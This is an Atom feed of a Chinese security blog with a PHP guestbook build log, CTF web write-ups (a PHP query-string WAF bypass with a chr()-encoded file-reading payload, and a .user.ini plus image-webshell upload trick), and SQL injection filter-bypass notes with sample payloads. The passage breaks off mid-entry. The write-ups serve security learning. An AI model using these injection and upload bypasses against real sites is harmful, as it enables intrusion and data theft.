<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Da4er&#39;s Blogs</title>
  
  <subtitle>学而专，专而精。</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://da4er.top/"/>
  <updated>2020-03-03T13:12:21.440Z</updated>
  <id>https://da4er.top/</id>
  
  <author>
    <name>Da4er&#39;s</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>PHP留言板开发</title>
    <link href="https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html"/>
    <id>https://da4er.top/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91.html</id>
    <published>2020-03-03T12:59:59.000Z</published>
    <updated>2020-03-03T13:12:21.440Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。</p><a id="more"></a><hr><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>首先设计前端页面，前端页面主要使用的boostraps框架(因为这个框架简单好用23333…)。自己也不会前端，所以用到什么就去Boostrap官网现找。<br>其次是设计数据库，数据库的话需要三张表：user表，comment表，admin表。<br>设计代码如下：<br>comment：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create table comment(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    comment varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8 comment &quot;评论表&quot;</span><br></pre></td></tr></table></figure><hr><p>user表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create table user(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null ,</span><br><span class="line">    password varchar(255) not null ,</span><br><span class="line">    email varchar(255) not null,</span><br><span class="line">    comment varchar(255) not nul ,</span><br><span class="line">    join_date date not null ,</span><br><span class="line">    primary key(id),</span><br><span class="line">    unique key(username),</span><br><span class="line">    unique key(password)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure><hr><p>admin表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create table admin(</span><br><span class="line">    id int unsigned not null auto_increment,</span><br><span class="line">    username varchar(255) not null,</span><br><span class="line">    password varchar(255) not null,</span><br><span class="line">    primary key(id)</span><br><span class="line">)engine&#x3D;MyISAM default charset&#x3D;utf8</span><br><span class="line"></span><br><span class="line">insert into admin(username,password) values (&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;);</span><br></pre></td></tr></table></figure><hr><h3 id="功能点分析"><a href="#功能点分析" class="headerlink" title="功能点分析"></a>功能点分析</h3><p>在设计后台代码的时候，首先是分析功能点，这个很重要。<strong>因为大网站都是靠一个个小的功能点堆积起来的。</strong><br>这个留言板主要的功能为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用户注册</span><br><span class="line">用户登录</span><br><span class="line">密码找回</span><br><span class="line">个人信息设置(信息更新 头像上传)</span><br><span class="line">留言发布</span><br><span class="line">留言展示</span><br><span class="line">前台留言分页展示</span><br><span class="line">搜索界面</span><br><span class="line">管理员后台登录</span><br><span class="line">后台用户管理</span><br><span class="line">后台留言管理</span><br></pre></td></tr></table></figure><p>所以在写的时候，要一个功能一个功能的去实现。</p><hr><h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>代码就不展示了，太多了23333….. 最后放几张效果图吧</p><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/1.png" class title="Da4er"><img src="/PHP%E7%95%99%E8%A8%80%E6%9D%BF%E5%BC%80%E5%8F%91/2.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;经过两天的奋斗，终于把一套简单的PHP留言板开发完成了。这套源码从前台到后台，最后到数据库都是一步一步来完成的，主要是为了熟悉一下PHP开发的基本流程和一些功能点的设计思路，为了接下来的代码审计做准备。&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>BUUCTF Web持续更新</title>
    <link href="https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-03-03T02:47:54.000Z</published>
    <updated>2020-03-03T02:52:57.439Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p><strong>知识点：PHP字符串的解析漏洞。</strong></p><blockquote><p>PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：</p></blockquote><a id="more"></a><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png" class title="Da4er"><p>当我们传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20%20da4[er%00&#x3D;42&quot;+AND+1&#x3D;0–</span><br></pre></td></tr></table></figure><p>PHP在解析的时候会自动将不合法的字符转换，转换规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.删除空白符</span><br><span class="line"></span><br><span class="line">2.将某些字符转换为下划线（包括空格）</span><br></pre></td></tr></table></figure><p>所以上面的参数最后会变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">da4_er&#x3D;42&quot; AND 1&#x3D;0–</span><br></pre></td></tr></table></figure><p>从而绕过一些waf的检测。<br><strong>解题：</strong><br>查看网页源代码发现题目存在waf，同时发现calc.php的后台处理程序。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/2.png" class title="Da4er"><p>访问calc.php:</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/3.png" class title="Da4er"><p>当我们传入非int型的参数后，会被waf拦截：</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/4.png" class title="Da4er"><p>但是可以传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空格num</span><br></pre></td></tr></table></figure><p>绕过waf检测。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/5.png" class title="Da4er"><p>绕过之后就是简单的代码执行，但是过滤了一些特殊字符，可以使用chr()函数绕过。<br>首先通过scandir扫描根目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/6.png" class title="Da4er"><p>最后通过file_get_contents函数读取文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));</span><br></pre></td></tr></table></figure><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/7.png" class title="Da4er"><hr><h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p><strong>知识点：.user.ini创建隐藏后门。</strong></p><blockquote><p>.user.ini中设置php.ini中PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置，而且只要是在使用 CGI／FastCGI 模式的服务器上都可以使用.user.ini。</p></blockquote><p>利用方法：.user.ini可以自定义php.ini，所以我们可以设置两个参<strong>auto_prepend_file和auto_append_file</strong><br>这两个参数的意思是：如果在上传的.user.ini目录下，有一个可执行的php文件，那么设置这两个参数后可以自动包含其他的php代码文件，如同：<strong>require和include作用一样。</strong></p><p>唯一不一样的是：auto_prepend_file在文件前插入，auto_append_file在文件后插入。<br>所以我们在.user.ini文件中写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;da4er.jpg</span><br></pre></td></tr></table></figure><p>那么在该目录下的可执行php文件中，会自动包含：<strong>require(“./da4er.jpg”);</strong></p><p><strong>解题：</strong><br>首先上传一个小马图片，这个题目作了三个限制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">不能上传ph或php结尾的，</span><br><span class="line">存在文件头过滤，需要添加图片文件的文件头</span><br><span class="line">文件的内容不能包含&lt;?，但可以上传&lt;script language&#x3D;&#39;php&#39;&gt;&lt;scirpt&gt;类型的图片马来绕过。</span><br></pre></td></tr></table></figure><p>上传后发现目录下还存在一个index.php，这就给利用.user.ini提供了条件</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/8.png" class title="Da4er"><p>所以直接上传.user.ini文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;script.jpg</span><br></pre></td></tr></table></figure><p>便可得到flag。</p><img src="/BUUCTF-Web%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/9.png" class title="Da4er">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;RoarCTF-2019-Easy-Calc&quot;&gt;&lt;a href=&quot;#RoarCTF-2019-Easy-Calc&quot; class=&quot;headerlink&quot; title=&quot;[RoarCTF 2019]Easy Calc&quot;&gt;&lt;/a&gt;[RoarCTF 2019]Easy Calc&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;知识点：PHP字符串的解析漏洞。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。例如：/?foo=bar变成Array([foo] =&amp;gt; “bar”)。值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替，如下图：&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://da4er.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>关于我</title>
    <link href="https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html"/>
    <id>https://da4er.top/%E5%85%B3%E4%BA%8E%E6%88%91.html</id>
    <published>2020-03-02T08:29:56.000Z</published>
    <updated>2020-03-02T08:50:53.164Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><img src="/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg" class><p>努力赶上大佬的安全小白；<br>励志做一个安全研究员的大学生；<br>三流CTFer。</p><hr><p>2020年计划：<br>用PHP开发一个MVC架构的项目；<br>用Python写一个Scrapy的分布式爬虫；<br>努力刷题，让自己在CTF小有成就。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;img src=&quot;/%E5%85%B3%E4%BA%8E%E6%88%91/1.jpg&quot; class&gt;
&lt;p&gt;努力赶上大佬的安全小白；&lt;br&gt;励志做一个安
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>2020_2月总结</title>
    <link href="https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/2020-2%E6%9C%88%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-02T03:10:39.000Z</published>
    <updated>2020-03-02T03:41:18.847Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="74aa9c474218ccb693706d1f274390a66028c792491e7b50ebcaa87c85587038">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7f39e3a999cac91df2fdfee5f4bb7998e45d0ea263e40ca1297aa6acd89bfdf9f330bed965ec1708a58659da4cd6b48d0c26607f6ba7c06e65cb742bf637ee4696352116ea8f480780e3bcccd2bf48198b604d9293d44b74c665cfdd46d736e2aa16665a8ca733cfe0f7a300ab8e1382be3c94f3d2de850bc096721faa49b4e748f884c9c718fd62c9d70f8d22d03e01cfa0221772001bada8966d5c23f0d0a58c781a572a136f459b6f8a156f6a05f5d183b6b4c45c50068706658683c390d523cb5159d11f458d15c9cf8e6a4c5419a1895fa17afed63455e3a9dfb44a5c1ef17615e57ded75399783ab0a1208ff5c0aef6cf79a4bda27dc2a86b2cba61bee46f2777d93e7b10fa5cf0fb8f24d2207839959ae54833bfe95bfc13a41ec5e9cd9fca9df344125fe80c42553881de414fbbc7d2aa134fd4505bed384600fae2e31a6f021efca0a2dfe816f85b948224620eeed111a00cf3350186249d0eaee5568b87c828708ee594813270907eb57b6fe2c08f5a5a3cb784da48cba5259dd20a9090b43dee064fa1dd0703700b378cbd2a8a3af4f8f9b2e231c4976135d7931b6fefb3d3ea9e66908203e1a5ad9fadc52f33d1752942447aeb6f950bd802261c457718d9640e2674d2aea0cc0a0b458843e7a04c456d52bdcb94b87676b5c47709de984dfbc17c226aff7e57b9e1643fde06f9e3b2832a4699e4d89d155b9dd69ce08266205094662b3c2706e5c1d95863851605115c5ba2f3782ff2f40865726f5fd859fd2cf3b6ae5a55efa4c57ef928fe0b8c58a0f65a04c0dce95edcc24e58bf9284da80ff1528a6706f17b904972f632946dac26fefb5f65eac0911ff60676f2d0c47347daf8009fe2e8d18a28e85151f0a4dafba7461ddc19c38a4666cc5ece40abdb48a58eaf1d2d0cf26233581bb014b1046f6bf23c9def456b80ba61401c882cbb88ee7e8be59f325c9186fdd095d6fb395e1c97395f5bb20ed51c16cdf15ea396f3308018a6f2411942695590cd6dedf8bf3f369cde797d437f08a0ee56c5d9fe339f22f2b64f376ea83f5714af777b90d768132e5be3c9d9026257f33435f6cce36edcdd37c7804febef0a80e0ae9260723f1d52d48b1d3f96a827702d886762a8eb639a265bf8b36b047db2169fe77cbf5b27e82d11785d3436cb6e400c3325a594f3609782ff39a174ffd438b909404fc71830a2926661ae81dd0c1df4425c371357d7cbd91a4b3f43e25da8e3838ab710e9cf674369aa1a5a9388e8e5c005c4fa1819120bdd84684dab352cc54ea0ed0af7d149f8b7160528e165e9a52fb6c2a86eae9080d3119408f249bfca7708b9daf936f0a9e4914519deff3803c770a1cabc0f3e17089c15c30033f546c96fc1964b287a91122fcd69a14e0efee79fffc61729d781c6f5627cbec1c7b1eeb252f7a1dc189be76c71402cb567d53701d8c3148ed7102188185dbeb4f4e88e4318861a955b69dd1657da3f8d59177418978090752205507ea2034312dc62b3c1068387d7b48badcd573354b922c713f8e88caf826d01be003499e5c5dca037e50da48ccb9f32a9d296be86443aa55ed97b144ecfb88f4e0bcbed7234ff80375557026fb11f0721f594202d33a5a59b59f1bc3919071ee8f5980d813cd5e4df325852ae7729de8b92462856acaa73b8986c9c12f381efb7faa368eebff0bd91326459c81b132cd063a4103e8c72444aed643145b0a3da11d9264f292b99e8a29641125b45420f5c1cf6bc4e93e4d5cd2a5a4e249607d51d036369d8840763765fc0dc9e13ab969ead547f31f351fc2899574dddc17b685dc186e0f0b6a83bbfeaf30a8c71ed91b279411f16f0e5f8efb044e160adc995c59f1fb3430b2ebeff9756748cf4e6f39befdf6c1352854397b6138a2fd146038973dedc8b368a33a06d94717dd884e6562a2b6d92d64d4507b8f792748367fd8fd44e00e9b243f8aecadf251edb4088ac17d94b6e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="随笔" scheme="https://da4er.top/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
  </entry>
  
  <entry>
    <title>Java学习笔记</title>
    <link href="https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://da4er.top/Java%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</id>
    <published>2020-02-27T10:40:25.000Z</published>
    <updated>2020-03-02T08:29:04.290Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3af6361fe0ab74ef8b5d8a656432e6a62199dc44322996d5059095d587ef12f8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://da4er.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入Trick(持续更新.....)</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5Trick-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html</id>
    <published>2020-02-26T08:16:54.000Z</published>
    <updated>2020-02-27T10:51:17.800Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="64eb5633c8aedaa35c872faa21d0b5280fb571957d0e1066c3170faaf119c472"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web安全&amp;渗透测试" scheme="https://da4er.top/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入绕过笔记(一)</title>
    <link href="https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html"/>
    <id>https://da4er.top/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80.html</id>
    <published>2020-02-25T07:46:56.000Z</published>
    <updated>2020-03-02T02:59:16.257Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="0x01-数据库特性"><a href="#0x01-数据库特性" class="headerlink" title="0x01 数据库特性"></a>0x01 数据库特性</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>常见的注释符号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#，--空格，-- -，--+，&#x2F;&#x2F;，&#x2F;**&#x2F;，&#x2F;*任意字符串*&#x2F;，;</span><br></pre></td></tr></table></figure><p>一般是使用/**/来绕过过滤空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;1;</span><br><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users&#x2F;*111*&#x2F;where&#x2F;**&#x2F;id&#x3D;1;</span><br></pre></td></tr></table></figure><p>上面两条语句执行结果是一样的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/1.png" class title="This is an test image"><p>需要注意的是：虽然#，–空格 – - –+都是注释符，但是在不同网站对它们的解析不同。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/2.png" class title="This is an test image"><p>这个时候就需要我们多加测试，看看哪种注释符可以被网站的数据库解析执行。</p><a id="more"></a><p>这里来了个知识点：怎么绕过过滤空格加注释符的sql注入？<br>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,4&#x2F;**&#x2F;or&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>我们可以使用/**/ 块注释或者一些url编码的特殊字符(%09,%0a,%0b,%0c,%0d,%20,%a0 )来替换空格，用or ‘1’=’1的方式闭合后面的引号，这样就可以绕过空格加注释过滤的sql注入。</p><p><strong>在本地测试的时候不能直接把%09等特殊字符放到sql语句中，必须经过url解码。</strong></p><p>其他可以代替空格的方法：<br><strong>浮点数代替空格</strong></p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/3.png" class title="This is an test image"><p><strong>科学计数法代替空格</strong></p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/4.png" class title="This is an test image"><p><strong>括号绕过()</strong><br>在进行空格的时候需要注意：不是所有的语句都支持括号代替空格的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/5.png" class title="This is an test image"><p><strong>所以进行括号绕过时，需要在本地测试看语句是否支持括号。</strong><br><strong>加号减号绕过(+,-)</strong><br>进行绕过时最后将+和-进行url编码。<br>和括号绕过一样，对于有些语句是不支持的。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/6.png" class title="This is an test image"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96; &#96;号绕过</span><br><span class="line">select * from&#96;users&#96;;</span><br></pre></td></tr></table></figure><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/7.png" class title="This is an test image"><p>同上面一样对于一些语句也是不支持。</p><p><strong>~,!,@,+,-,””,’’,{}等特殊字符绕过空格。</strong><br>这些绕过过滤的空格的字符，在一些语句都是不支持的，需要在本地经过测试才行。</p><hr><h4 id="sql函数和关键字"><a href="#sql函数和关键字" class="headerlink" title="sql函数和关键字"></a>sql函数和关键字</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure><hr><h3 id="0x02-绕过过滤"><a href="#0x02-绕过过滤" class="headerlink" title="0x02 绕过过滤"></a>0x02 绕过过滤</h3><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><p>数据库对大小写不敏感，如果后台代码只过滤的小写的关键字，我们可以通过大小写混合来绕过。</p><img src="/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0-%E4%B8%80/8.png" class title="This is an test image"><h4 id="内联注释"><a href="#内联注释" class="headerlink" 